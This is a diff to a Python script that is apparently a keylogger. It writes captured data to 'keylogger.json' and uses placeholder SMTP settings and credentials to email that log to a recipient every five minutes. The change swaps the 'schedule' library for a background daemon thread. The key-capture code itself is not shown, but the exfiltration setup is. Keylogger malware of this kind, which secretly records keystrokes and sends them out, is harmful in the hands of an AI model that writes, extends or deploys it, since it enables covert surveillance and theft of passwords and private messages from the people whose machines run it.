@@ -4,16 +4,16 @@ from email.mime.base import MIMEBase
 from email import encoders
 from datetime import datetime
 import json
-import schedule
 import time
 import os
+import threading
 
 # Email configuration
-SMTP_SERVER = 'smtp.your_email_provider.com'
+SMTP_SERVER = 'smtp.your_smtp_code.com'
 SMTP_PORT = 587
-USERNAME = 'your_email@example.com'
-PASSWORD = 'your_email_password'
-TO_EMAIL = 'reciever_email@example.com'
+USERNAME = 'name@example.com'
+PASSWORD = 'Password'
+TO_EMAIL = 'name@example.com'
 
 log_file = "keylogger.json"
 
@@ -61,8 +61,17 @@ def job():
     os.remove(filename)
 
 
-schedule.every(5).minutes.do(job)
+def run_scheduler(interval, func):
+    while True:
+        func()
+        time.sleep(interval)
 
+
+# Run the scheduler in a separate thread, executing `job` every 5 minutes (300 seconds)
+scheduler_thread = threading.Thread(target=run_scheduler, args=(300, job))
+scheduler_thread.daemon = True
+scheduler_thread.start()
+
+# Keep the script running
 while True:
-    schedule.run_pending()
     time.sleep(1)
